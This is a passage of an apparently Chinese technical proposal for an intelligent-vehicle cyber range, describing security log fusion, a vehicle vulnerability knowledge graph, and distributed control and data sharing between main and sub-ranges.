title="方案简介"></a>方案简介</h3><p>面对不同的安全数据来源比如防火墙、IDS、IPS、WAF、EDR等安全设备，这些数据通常具有不同格式、结构和粒度，需要对这些数据进行去除重复数据、处理缺失数据、解决数据不一致性等处理，并将数据结构和数据内容多样的数据解析并整合成统一的数据集，便于后续攻击检测研判、安全分析评估等理解与使用。</p><p>系统提供了强大的功能，能够对国内一些常见大众的安全厂商检测设备产品日志进行全面处理，包括融合、解析、收集以及转换析等关键操作。性能上，系统每秒能够融合生成至少5000条基础攻击数据，并且能够融合的安全事件类型数量高达52000种。此外，系统还可以处理超过20种不同类型的检测设备，覆盖了常见厂商，如启明星辰、深信服、绿盟科技、奇安信、新华三以及天融信等。这一系列强大的功能将大幅简化安全数据处理的复杂性，使安全团队能够更轻松地理解和利用这些多样化的安全数据。</p><p>该模块提供了一套完整的安全事件管理和组织体系。首先，用户可以根据事件信息对安全事件进行基础攻击类型的组织，使安全事件更有条理性和可理解性。其次，系统支持基础攻击类型知识体系的维护与管理，这一体系按层次分类，其中第一层分类超危窃取利用类、高危远程控制、低危扫描探测类、中危攻击突破类。此外，系统还能够维护安全事件和基础攻击类型之间的关系知识体系，涵盖了维护源目地址是否交换、事件描述、基础攻击ID以及安全事件ID等信息。系统的功能还包括支持基于设备型号进行关系维护，用户可以方便地添加、修改、删除和查询规则，同时支持批量导入、导出和删除的管理操作。另外，系统提供了基于关键词分类方式的安全事件组织功能，这有助于在无法完全覆盖安全事件与攻击类型映射关系的情况下进行组织和融合。最后，系统还允许用户维护关键词与基础攻击类型之间的映射关系，包括管理关键词组和攻击类型等相关信息。在关键词管理中，用户可灵活使用多种通配符和逻辑运算符。通配符方面，支持使用’?’表示任意一个字符，’*‘表示N个任意字符，’’表示转义符，放置于特殊符号前可将其转换为普通符号。逻辑运算符涵盖与(&amp;)、或(|)、非(!)，同时允许使用括号()来组合关键字并能够区分优先级。</p><p>安全数据获取及对应文件标准化格式如下示意，从安全防护设备中实时获取安全数据。将从安全防护设备中获得的原始数据日志输入到系统中。其中安全防护设备日志文件包含“源IP/源端口/目的IP/目的端口/警告类型”等信息，对日志数据使用“/”作为每一项信息的分隔符对重要信息进行存储，形成标准化日志格式。例如：防火墙处的日志格式为“12.XX.XX.XX/设备X1/时间t1/行为日志等”，IDS处的日志格式为“源IP/入侵检测IP/时间戳/事件等”，WAF处的日志格式为“源IP/访问时间戳/是否阻断等”，EDR处的日志格式为“源IP/时间戳/目标IP/认证结果等”。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/13ca50808fe2085653019cba248e4e6c.png"></p><p>系统能够不同数据源的多源异构日志数据，将安全防护设备获得的标准化日志数据进行整合，创建统一数据库及数据库表，其数据列包括源IP、源端口、目的IP、目的端口、时间戳、事件行为、告警类型等信息。其中对日志文件中的事件行为、告警类型等文本信息采用分类等技术对日志进行事件及告警分类，提取事件行为要素。对于多条数据记录，采用聚类等技术将相似来源、相似行为、相似目的数据记录从不同角度进行聚类，并基于聚类结果进一步提取安全数据要素。如下图所示，对不同行为日志进行文本分类，从而提取三条行为日志中的行为要素A,行为要素B和行为要素C等，再利用聚类技术将三条记录进行聚类。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/05c11c361a12d343aebde62157e19e3d.png"></p><p>安全数据融合体系结构如下所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/dcb145cf30e88d1ad48f65a69bfffccd.png"></p><p>数据采集：从各种数据源收集原始数据，包括各位安全设备，确保采集的数据包括所需的关键信息，并记录数据源和时间戳。</p><p>数据清洗：对原始数据进行清洗和预处理，包括去除重复项、处理缺失数据、解决异常值、规范化数据格式等，以提高数据质量。</p><p>数据整合：将来自不同源头的数据整合到一个一致的数据集中，包括数据结构的转换、字段映射、数据合并等操作。</p><p>数据融合：将数据转换为融合到统一知识体系中，适用于后续分析与应用。融合方式包括基于关键字的融合和基于事件类型的映射。</p><p>数据融合主要包含以下模块元素。系统需要对数据源设备进行管理，包括添加、修改、删除，且可通过上传下载文件的方式进行批量导入与导出，设备信息包括名称、厂商、类型、型号和地址。数据采集方式能够在界面配置基于TCP和UDP的syslog方式以及kafka方式进行日志数据接入。此外，支持快速零代码编程，实现不同厂商、不同设备的日志数据解析。数据解析方面可以在界面添加、修改与删除解析规则，针对某一具体规则，系统提供了配置选项，涉及到日志样本、相应的解析方式、对应的分隔符以及过滤符号等多个方面的配置。解析方式方面，系统支持两种解析方法，即键值对和固定分隔符，用户可以根据需要选择。键值分隔符则提供了等号、冒号、空格等不同的设置选项，字段分隔符内置了多种选项，如分号、逗号、通道符、tab键等，以满足用户对于日志样本解析的多样化需求。用户可根据实际需求进行灵活配置。此外，还支持基于正则表达式来解析日志数据，以适应的不同日志格式，并能通过描述、CVE漏洞信息、目的端口、源端口、目的IP地址、源IP地址、事件ID以及时间等字段映射具体内容。最后通过界面上维护的安全事件和关键字，将其融合到统一知识体系。同时该模块可以自动将融合后的基础攻击数据与VLAN以及IP地址相关联，进而自动生成相应的应用试验任务，随之产生基础攻击相关的靶标、队伍以及设备信息。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/457326bf066b644d8c6843113aa1aac8.png"></p><h2 id="关键功能截图"><a href="#关键功能截图" class="headerlink" title="关键功能截图"></a>关键功能截图</h2><ol><li>可基于网络安全知识图谱中的知识，结合靶场汽车应用试验关联的节点、资产、漏洞数据，构建应用试验相关的试验场景图谱，支撑攻击检测分析与扩展研究，知识图谱关联的节点至少包含被测车辆、零部件、虚拟化MCU、虚拟化MPU等4种类型，关联的资产至少包含整车品牌、车型、车辆、车型项目（年款）、包含的零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等9类信息，漏洞数据至少包含漏洞名称、CVE编号、涉及平台、危害级别、漏洞类型、公开日期等6类信息。以上信息均可在同一个子图中以可视化的形式展现。</li></ol><p><strong>响应方案:</strong></p><p>基于网络安全知识图谱的丰富知识，结合与靶场汽车应用试验关联的多个要素，可以构建出强大而全面的应用试验相关的试验场景图谱。这个知识图谱将为攻击检测分析和进一步的扩展研究提供坚实的基础。在这个知识图谱中，将聚焦于多种类型的关联节点，涵盖了汽车领域的关键组成部分。</p><p>以下是知识图谱关联的主要节点类型，每种节点类型都以可视化的方式展现：</p><ol><li>包含了汽车的标识信息、车型和车辆特性等。</li><li>可以清晰地显示被测车辆的属性和特征。</li><li>涵盖了车辆中各个组件的信息，如引擎、制动系统、安全气囊等。</li><li>提供了零部件的类型、型号和技术规格等详细信息。</li><li>包括了虚拟化MCU的配置和性能参数要求，用于车辆电子系统的控制。</li><li>可视化展示虚拟化MCU的组成和功能。</li><li>包括了虚拟化MPU的信息，这是车辆计算平台的核心。</li><li>提供了虚拟化MPU的性能规格和操作系统信息。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c4828a17fbbab94021530d335b79ed40.png" alt="IMG_256"></p><p>在知识图谱的节点之间，还包括了关联的资产信息，这些信息涵盖了广泛的领域，如：</p><ol><li>识别汽车的制造商和品牌信息，以便确定车辆的制造背景。</li><li>确定车辆的具体型号和车型名称，以区分不同类型的汽车。</li><li>提供关于每辆车辆的详细信息，包括车辆的VIN号、注册信息等。</li><li>包括车型的不同年份版本，以跟踪车型的发展历程。</li><li>描述车辆零部件的硬件平台和技术规格。</li><li>提供车辆系统使用的操作系统内核的版本信息，以便安全性分析。</li><li>记录车辆各个组件的固件版本号，以便检测潜在漏洞。</li><li>包括车辆中使用的中间件的版本和配置信息。</li><li>提供车辆中运行的应用程序的版本和相关信息。</li></ol><p>最后，还将整合漏洞数据，其中包括漏洞的名称、CVE编号、涉及平台、危害级别、漏洞类型和公开日期等关键信息。这些数据将与其他节点相互关联，以帮助系统分析漏洞对车辆和零部件的潜在威胁。整个知识图谱将为智能汽车网络靶场提供全面的视图，帮助分析和解决安全挑战。</p><ol><li>支持试验相关数据概括呈现，包括试验关联队伍、靶标、设备相关数据和试验资产漏洞、基础攻击、有效攻击、复杂攻击等相关安全攻防数据统计与直观展示，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/1d1cdddf78604325aa49f166f9693e86.png" alt="企业微信截图_6e2605f8-a886-43b7-9c5f-1125f1cffa5c"></p><ol><li>支持在微观拓扑中展示对应汽车靶标节点信息，包括车联网业务管理后台、TBOX、网关、车机、域控制器等类型，节点名称可编辑，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ac0169e9b76ab1ef195b11550bcd6c31.png"></p><ol><li>支持图谱路径查询，可指定起始节点、目标节点、方向进行路径查询与展示，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7520345467b4bc4c8cacb1e8787efaa8.png"></p><ol><li>支持对探测设备进行条件查询，包括名称、IP、型号等模糊查询，需提供产品功能截图。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/43e9252d7e99b6d31f4f0d853b7f3c1e.png"></p><ol><li>支持对探测结果进行解析，生成资产IP、漏洞ID、漏洞分数、漏洞类型、漏洞描述等信息，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f2ebea3140b7af72282bbfc179e6164f.png"></p><ol><li>可探测漏洞数量不低于30000个，需提供产品功能截图证明，截图中需有具体的漏洞数量并能清晰识别。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ec1a3f365da0eb7e21cd97b995e26bcb.png"></p><ol><li>支持流量抓包任务的控制操作，包括启动、停止、下载、删除，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a999e605c96869d93efd0eef57258c9f.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/965808a935e43286f26f797c100d7675.png"></p><ol><li>支持通过文件上传、下载实现日志源设备的批量导入、批量导出，可快速、便捷地进行设备管理，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4d8ae83c76467621de2a9fb89cb7339a.png"></p><h1 id="智能汽车网络靶场分布式适配分系统"><a href="#智能汽车网络靶场分布式适配分系统" class="headerlink" title="智能汽车网络靶场分布式适配分系统"></a>智能汽车网络靶场分布式适配分系统</h1><h2 id="分布式试验管控模块"><a href="#分布式试验管控模块" class="headerlink" title="分布式试验管控模块"></a>分布式试验管控模块</h2><ul><li>支持主靶场下达开始、暂停、停止分布式场景的控制命令，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8581226f92c76dcd23a0e810455e4019.png" alt="IMG_256"></p><p>功能参数设计为，系统支持主靶场下达开始、暂停、停止分布式场景的控制命令。分靶场接收主靶场试验管控调度指令，控制靶场试验进度。分靶场向主靶场发送试验状态信息，包括人员接入状态和试验运行状态。分靶场向主靶场发送演练提交结果信息，接收主靶场的跨靶场结果验证信息。主靶场汇总用户提交记录信息同步到分靶场。主靶场下达分靶场实验资源调度生成指令，部署实验环境，实现主靶场用户访问分靶场资源。</p><h4 id="项目背景-2"><a href="#项目背景-2" class="headerlink" title="项目背景"></a>项目背景</h4><p>随着网络安全演练和教育的需求日益增长，分布式靶场系统成为了一种高效的解决方案，它允许多个靶场相互协作，共享资源，实现大规模、多节点的网络安全演练。本系统旨在提供一个集中管理的平台，以实现对分布式靶场环境中的试验管控、状态同步、结果提交和验证等功能的集成。</p><h4 id="功能-5"><a href="#功能-5" class="headerlink" title="功能"></a>功能</h4><p>靶场管控命令下达</p><p>管控命令下达：支持主靶场对分布式场景的开始、暂停、停止等控制命令的下达。</p><p>靶场试验进度管控</p><p>试验管控调度：支持分靶场接收主靶场的试验管控调度指令，以控制靶场的试验进度。</p><p>试验状态信息同步</p><p>状态信息反馈：支持分靶场向主靶场发送试验状态信息，如人员接入状态、试验运行状态等。</p><p>演练结果提交与验证</p><p>结果提交与验证：支持分靶场向主靶场发送演练提交结果，并接收主靶场的跨靶场结果验证信息。</p><p>实验资源调度与访问</p><p>实验资源调度：支持主靶场下达分靶场某个实验资源的调度生成指令。</p><p>实验资源访问：保证主靶场的用户能够访问分靶场生成好的实验资源。</p><h4 id="系统架构-2"><a href="#系统架构-2" class="headerlink" title="系统架构"></a>系统架构</h4><p>主靶场管理模块</p><p>负责整个分布式靶场系统的中心管理。</p><p>实现对分靶场的控制命令下达。</p><p>汇总分靶场的试验状态信息和演练结果。</p><p>分靶场管控模块</p><p>接收来自主靶场的试验管控调度指令。</p><p>反馈试验状态信息至主靶场。</p><p>提交演练结果至主靶场，并接收验证信息。</p><p>实验资源调度模块</p><p>接收主靶场的资源调度指令，部署实验环境。</p><p>管理实验资源的分配和访问权限。</p><p>网络通信模块</p><p>保障主靶场与分靶场之间的通信顺畅、安全。</p><p>实现数据的加密传输和身份验证。</p><h4 id="技术实施"><a href="#技术实施" class="headerlink" title="技术实施"></a>技术实施</h4><p>高可用性：确保系统稳定运行，能够及时响应各种管控命令。</p><p>实时性：状态信息和演练结果的反馈应具有较高的实时性。</p><p>安全性：通信过程中要保证数据的加密和系统的防护。</p><p>扩展性：系统设计应考虑未来靶场数量的增加和功能的拓展。</p><p>通过实施本方案，可以实现对分布式靶场环境的高效管理和管控，提高网络安全演练的协作性和灵活性。系统的设计兼顾了实时性和安全性，确保了各项数据的准确传输和处理。通过集中管理平台，主靶场能够有效地调度资源，同步信息，并验证演练结果，为用户提供一个统一的操作界面和体验。</p><h3 id="方案简介-17"><a href="#方案简介-17" class="headerlink" title="方案简介"></a>方案简介</h3><p>分布式试验管控模块支持向联邦靶场态势系统发送演练配置信息，支持接收联邦靶场态势系统的跨靶场结果验证信息。支持将本网络仿真平台配置分析采集数据、检测数据等发送到主靶场或其它分靶场做进一步分析。同时支持手动同步更新分靶场和主靶场数据。</p><p>分布式试验管控模块支持选择相关设备分别下发资产探测、漏洞探测、流量采集后，采集到的资产漏洞数据、流量数据等任务数据，以及检测到的攻击数据将上报到绿方系统，上报支持Kafka、Syslog等方式。</p><p>试验可对分靶场下发攻击子图注册任务，子图包括基础攻击子图和复杂攻击子图。从分靶场接收的安全事件数据经过融合得到不同类型的基础攻击子图，基础攻击子图将基于时空关系经由关联分析模块进一步组合得到复杂攻击子图。根据攻击数据与攻击子图进行匹配，将进一步得到有效基础攻击和有效复杂攻击。</p><p>全局数据支持根据试验或分靶场分类查看。数据传输过程中支持加密安全传输。</p><p>系统展示所有与主靶场互联的分靶场信息，包括分靶场名称、IP地址、地理位置、在线状态等，点击详情可查看分靶场的详细信息。系统还对主靶场下发到分靶场的试验进行汇总展示，包括试验名称、创建时间、试验进度、试验任务（资产探测、漏洞探测、流量采集、注册攻击子图）等，支持根据试验名称模糊查询，根据试验进度或创建时间精确查询。点击单个试验的资产探测/漏洞探测/流量采集查看任务详情，包括任务信息和任务对应的采集数据。每个试验可下发注册攻击子图任务，包括基础攻击子图和复杂攻击子图，用于攻击检测的关联分析。</p><p>所有分靶场的安全事件、基础攻击、复杂攻击、有效基础攻击和有效复杂攻击都将通过加密传输到主靶场进行全局攻击分析。</p><h2 id="分布式目标网络互联模块"><a href="#分布式目标网络互联模块" class="headerlink" title="分布式目标网络互联模块"></a>分布式目标网络互联模块</h2><ul><li>支持主靶场网络拓扑编辑时，使用分靶场中的资源进行拓扑编辑，并与主靶场的拓扑编辑融为一体互联互通，用以支撑联邦试验开展共享测试资源，至少支持10个异地靶场的互联，每个靶场至少提供10个被测节点，其中至少包含1个实物节点，同时接入进行测试的人员不低于1000人。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7d1d20731fcde6e55afc32b689bb5e19.png"></p><p>联邦靶场互联</p><p>为了迎合现代联邦试验的要求和支撑共享测试资源的需要，本系统具备强大的网络拓扑编辑功能。该功能不仅支持主靶场网络拓扑的编辑，还可以实现分靶场资源的整合和利用。通过这种设计，即便是分布在不同地理位置的靶场也能够将自己的资源投入到联合网络的拓扑结构中，这些靶场之间将能无缝联接，实现互联互通的高效能力。</p><p>通过本系统，用户可以在主靶场网络拓扑编辑中方便地使用来自分靶场的资源。这意味着无论资源位于何处，都可以被整合入总体测试网络中，从而为联邦试验提供所需的测试场景和网络环境。该系统的设计理念基于网络测试的共享和协作，进一步加强了不同测试靶场之间的合作机制。</p><p>系统支持10个异地靶场的互联互通，每个靶场提供10个被测节点，为用户带来了不同地点、不同环境下的测试体验和数据。每个靶场包含1个真实的实物节点，确保测试结果的实用性和真实性。实物节点的接入提供了有形资产的测试能力，对于物理网络环境下的安全漏洞分析与网络性能测试至关重要。</p><p>本系统能够支持1000名用户同时接入并进行测试。这一能力展示了系统出色的用户负载能力与资源管理效率。大规模用户接入模拟可以极大地模拟真实世界中网络的负载和压力情况，使得测试更加紧贴真实运营环境。</p><p>通过如此高效强大的网络设计和测试平台，能够极大地支援跨地区、跨网络环境的广泛测试需求。它不单单局限于汽车网络安全的测试，还可以拓展到其他需要联合网络资源共享以及大规模节点与用户测试的领域，如云计算、物联网等先进技术领域。这将有助于推动不同行业之间的技术交流与合作，同时也能确保网络环境和系统在面对各种挑战时的高度安全与稳定性。</p><p>功能参数设计为，系统支持资源注册到主靶场，分靶场可以管理分享给主靶场使用的资源范围和数量。主靶场对分靶场注册管理，授权分靶场可使用资源。主靶场查看分靶场镜像、靶标、赛题等资源，分靶场注册本地资源到联邦靶场。主靶场网络拓扑编辑时使用分靶场资源进行拓扑编辑，与主靶场拓扑编辑互联互通，支撑联邦试验共享测试资源。支持10个异地靶场互联，每个靶场提供10个被测节点，包含1个实物节点，同时接入测试人员1000人。驱动分靶场生成网络拓扑配置中用到的资源，生成分靶场与主靶场互联互通的试验环境。分靶场接受主靶场的互联调度，控制目标网络互联。</p><h4 id="项目背景-3"><a href="#项目背景-3" class="headerlink" title="项目背景"></a>项目背景</h4><p>在网络安全演练和联邦试验的背景下，多个靶场之间的资源共享和网络拓扑的互联互通变得至关重要。这不仅要求靶场之间能够高效地共享资源，还要求能够构建一个统一的网络拓扑，以支持大规模的网络安全测试和演练。本系统旨在实现主靶场与分靶场之间资源的注册、管理、共享以及网络拓扑的编辑和互联。</p><h4 id="功能-6"><a href="#功能-6" class="headerlink" title="功能"></a>功能</h4><p>资源注册与管理</p><p>资源注册：分靶场可管理并分享资源给主靶场使用，包括资源范围和数量。</p><p>靶场注册管理：主靶场支持对分靶场的注册管理，并对分靶场可使用的资源进行授权。</p><p>资源查看与注册</p><p>资源查看：主靶场能够查看分靶场的镜像、靶标、赛题等资源。</p><p>资源注册：分靶场支持将本地资源注册到联邦靶场。</p><p>网络拓扑编辑与互联</p><p>拓扑编辑：主靶场可使用分靶场资源进行网络拓扑编辑，实现与主靶场拓扑的互联互通。</p><p>联邦试验支持：系统支持10个异地靶场的互联，每个靶场提供10个被测节点，包括1个实物节点，支持1000人同时接入进行测试。</p><p>试验环境生成与控制</p><p>环境生成：支持驱动分靶场生成网络拓扑配置中使用的资源，生成互联互通的试验环境。</p><p>互联调度：分靶场支持接受主靶场的互联调度，控制目标网络之间的互联。</p><h4 id="系统架构-3"><a href="#系统架构-3" class="headerlink" title="系统架构"></a>系统架构</h4><p>主靶场管理模块</p><p>实现对分靶场资源的查看、注册管理和授权。</p><p>负责网络拓扑的编辑和联邦试验的支持。</p><p>分靶场管理模块</p><p>管理分享给主靶场的资源。</p><p>注册本地资源到联邦靶场。</p><p>生成与主靶场互联互通的试验环境。</p><p>网络拓扑编辑模块</p><p>使主靶场能够编辑一个包含分靶场资源的统一网络拓扑。</p><p>支持高级网络拓扑设计和配置。</p><p>互联调度控制模块</p><p>控制分靶场与主靶场之间互联互通的网络环境。</p><p>实现目标网络之间的互联调度。</p><h4 id="技术实施-1"><a href="#技术实施-1" class="headerlink" title="技术实施"></a>技术实施</h4><p>高并发性能：系统需要支持1000名用户同时接入进行测试。</p><p>高可靠性：确保互联互通的网络环境稳定运行。</p><p>灵活性：允许用户根据需要灵活配置和管理资源。</p><p>安全性：保障数据的安全传输和用户的安全接入。</p><p>通过实施本方案，可以实现主靶场与分靶场之间的高效资源管理与共享，以及网络拓扑的灵活编辑和稳定互联。系统将支持大规模的网络安全测试和演练，满足联邦试验的需求。主靶场与分靶场之间的高度集成和协调，将为用户提供一个无缝的测试和演练环境，促进网络安全教育和实践的发展。</p><h3 id="方案简介-18"><a href="#方案简介-18" class="headerlink" title="方案简介"></a>方案简介</h3><p>分布式目标网络互联模块具备最先进的设计理念和技术，在技术标准方面遵循国际通用和广泛采用的标准，网络通讯协议和接口需符合国际标准，支持国际上通用标准的网络协议（如TCP/IP）网络的路由转发符合国际标准的路由协议，这样有利于保证分布式网络能够有统一的标准，使得与其他网络之间的平滑连接互通，方便业务的需要接入不同厂商的设备和网络产品。在系统架构上，分布式网络平台应采用可扩展的架构，便于灵活扩展，以便根据未来业务的增长和变化，可以平滑的扩充和升级，最大程度的减少对网络架构和现有设备的调整。易于增加新设备、新用户，易于和各种公用网络连接，随系统应用的逐步成熟不断完善靶场的功能。网络靶场是一个复杂的系统，在易维护性方面，需要能对系统本身的运行状态及资源进行集中监测，分权管理，并能告警与远程维护与管理。在可靠性方面，具有容错能力，并长时间的运行能可靠稳定运行。系统采用分布式的冗余备份，合理设计网络架构，制订可靠的网络备份策略，保证网络具有故障自愈的能力，最大限度地支持系统的正常运行。</p><p>基于分布式中间件技术，及其资源调度、分布式试验控制、分布式数据共享以及负载均衡等基础服务，实现分布式靶场跨平台和跨地域的互联互通，以及试验资源统一调度、试验数据统一分析等功能。</p><p>系统选用Java、JavaScript等多种语言混合搭建，作为一个大型系统，混合语言编程已经被大家所认可，且有着活跃的社区和充分的技术支持的组件作为系统的技术组成，在保证了系统成熟稳定的同时，也保证了技术的先进、可持续以及系统化。</p><p>微服务架构：基于Spring Cloud Alibaba 2.x，该框架实现了微服务的核心功能，包括服务注册与发现、配置管理、负载均衡、熔断限流等。它能够将多个主靶场和分靶场作为独立的微服务进行管理，实现系统的高可用和弹性伸缩。</p><h2 id="分布式态势分析互联模块"><a href="#分布式态势分析互联模块" class="headerlink" title="分布式态势分析互联模块"></a>分布式态势分析互联模块</h2><ul><li>支持试验中分靶场上报汽车安全事件数据到主靶场，提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b0df777e8d0313bbca3cf042df5eeab6.png" alt="1703516707411"></p><h3 id="方案设计-14"><a href="#方案设计-14" class="headerlink" title="方案设计"></a>方案设计</h3><p>功能参数设计为，系统支持分靶场主动请求主靶场进行知识共享和主动共享知识到主靶场。主靶场接收分靶场的共享知识，包括汽车资产、漏洞、弱点、基础攻击和复杂攻击知识。主靶场共享知识到分靶场，融合已有知识与共享知识，包括去重、补全等。知识共享记录管理，包括共享数据类型、时间、共享知识条数等。知识共享靶场管理，添加、修改、删除共享靶场信息。试验前主靶场接收分靶场资产漏洞数据，关联对应试验任务。试验前分靶场上报标记靶场信息后的资产漏洞数据到主靶场。试验前主靶场接收分靶场同步的基础攻击子图和复杂攻击子图，关联试验任务注册到有效攻击检测。试验中主靶场接收分靶场的安全事件数据，基于攻击类型知识体系进行归一化解析与融合。试验中分靶场上报汽车安全事件数据到主靶场。试验中主靶场接收分靶场的汽车攻击分析数据，关联对应试验后发送到可视化进行展示。试验中主靶场分析攻击数据发送到分靶场。分靶场上报给主靶场数据传输方式包括API、Kafka、Syslog。数据同步共享靶场管理，全局数据管理，数据同步记录管理。</p><h4 id="项目背景-4"><a href="#项目背景-4" class="headerlink" title="项目背景"></a>项目背景</h4><p>在分布式的网络安全演练环境中，知识共享和数据同步是提高演练效率、完善安全防护体系的关键。本系统旨在实现主靶场与分靶场之间的知识与数据共享，包括漏洞、攻击模式和安全事件等信息的交换，以及相关数据的管理和同步，从而提高整个联邦靶场系统的响应能力和智能化水平。</p><h4 id="功能-7"><a href="#功能-7" class="headerlink" title="功能"></a>功能</h4><p>知识共享机制</p><p>主动共享请求：分靶场可主动请求主靶场进行知识共享，也可以主动共享知识到主靶场。</p><p>知识接收与共享：主靶场支持接收和共享分靶场的知识，涵盖汽车资产、漏洞、弱点、基础攻击和复杂攻击知识。</p><p>知识融合与管理</p><p>知识融合：支持融合已有知识与共享知识，采用去重、补全等方式。</p><p>共享记录管理：支持知识共享记录的管理，包括数据类型、共享时间、条数等。</p><p>靶场信息管理：支持共享靶场信息的管理，包括添加、修改、删除等操作。</p><p>试验前数据准备</p><p>资产漏洞数据关联：主靶场在试验前接收分靶场资产漏洞数据，并关联到对应试验任务。</p><p>攻击子图同步：主靶场接收分靶场同步的汽车基础攻击子图和复杂攻击子图，并注册到有效攻击检测中。</p><p>试验中数据处理</p><p>安全事件数据处理：主靶场接收分靶场的安全事件数据，并进行归一化解析与融合。</p><p>攻击分析数据关联：主靶场接收分靶场的攻击分析数据，并关联到试验后的可视化展示。</p><p>数据传输与同步</p><p>数据传输方式：支持分靶场通过API、Kafka、Syslog等方式上报数据给主靶场。</p><p>数据同步管理：支持数据同步共享靶场管理，包括靶场名称、共享地址、共享方式等。</p><p>全局数据管理</p><p>统一大数据平台：采用统一化大数据平台进行数据表示、存储，并支持高效计算。</p><p>数据同步记录管理：支持同步数据记录管理，包括数据类型、同步时间等。</p><h4 id="系统架构-4"><a href="#系统架构-4" class="headerlink" title="系统架构"></a>系统架构</h4><p>知识共享中心</p><p>负责管理和调度知识共享和数据同步任务。</p><p>实现知识的融合、去重和补全。</p><p>数据同步控制器</p><p>控制数据的传输方式和同步过程。</p><p>管理同步数据的记录和共享靶场信息。</p><p>试验任务管理器</p><p>在试验前后关联和处理资产漏洞数据、攻击子图、安全事件和攻击分析数据。</p><p>安全事件处理器</p><p>在试验中接收和归一化解析安全事件数据。</p><p>联合攻击类型知识体系进行数据融合。</p><p>可视化与分析模块</p><p>展示试验结果和攻击分析数据。</p><p>提供直观的界面和数据分析工具。</p><p>数据传输接口</p><p>提供API、Kafka、Syslog等多种数据传输接口。</p><p>大数据平台</p><p>统一表示和存储数据。</p><p>提供高效的数据处理和计算能力。</p><h4 id="技术实施-2"><a href="#技术实施-2" class="headerlink" title="技术实施"></a>技术实施</h4><p>数据安全性：确保知识共享和数据同步过程的安全性。</p><p>高性能处理：系统应能处理大规模数据和高并发请求。</p><p>可扩展性：系统架构支持靶场数量和数据量的增加。</p><p>用户友好性：提供易用的管理界面和可视化工具。</p><p>通过实施本方案，联邦靶场系统将实现高效的知识共享和数据同步，加强靶场间的协作与信息交换，提升整个系统的安全测试和演练能力。通过统一的大数据平台和高效的数据处理机制，系统将为用户提供一个强大、灵活且安全的网络安全演练环境。</p><h3 id="方案简介-19"><a href="#方案简介-19" class="headerlink" title="方案简介"></a>方案简介</h3><p>分布式态势分析是智能汽车网络靶场分布式适配分系统中的一个重要组件，主要用于实现资产与漏洞探测任务、攻击子图结合分析、其他靶场数据接收与转发。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a5390fa3848a74507ec9f30b563e5328.png"></p><p>分布式态势分析具备最先进的设计理念和技术，在技术标准方面遵循国际通用和广泛采用的标准，网络通讯协议和接口需符合国际标准，支持国际上通用标准的网络协议（如TCP/IP）网络的路由转发符合国际标准的路由协议，这样有利于保证分布式网络能够有统一的标准，使得与其他网络之间的平滑连接互通，方便业务的需要接入不同厂商的设备和网络产品。在系统架构上，分布式网络平台应采用可扩展的架构，便于灵活扩展，以便根据未来业务的增长和变化，可以平滑的扩充和升级，最大程度的减少对网络架构和现有设备的调整。易于增加新设备、新用户，易于和各种公用网络连接，随系统应用的逐步成熟不断完善靶场的功能。网络靶场是一个复杂的系统，在易维护性方面，需要能对系统本身的运行状态及资源进行集中监测，分权管理，并能告警与远程维护与管理。在可靠性方面，具有容错能力，并长时间的运行能可靠稳定运行。系统采用分布式的冗余备份，合理设计网络架构，制订可靠的网络备份策略，保证网络具有故障自愈的能力，最大限度地支持系统的正常运行。</p><p>基于分布式中间件技术，及其资源调度、分布式试验控制、分布式数据共享以及负载均衡等基础服务，实现分布式靶场跨平台和跨地域的互联互通，以及试验资源统一调度、试验数据统一分析等功能。</p><p>系统选用Java、JavaScript等多种语言混合搭建，作为一个大型系统，混合语言编程已经被大家所认可，且有着活跃的社区和充分的技术支持的组件作为系统的技术组成，在保证了系统成熟稳定的同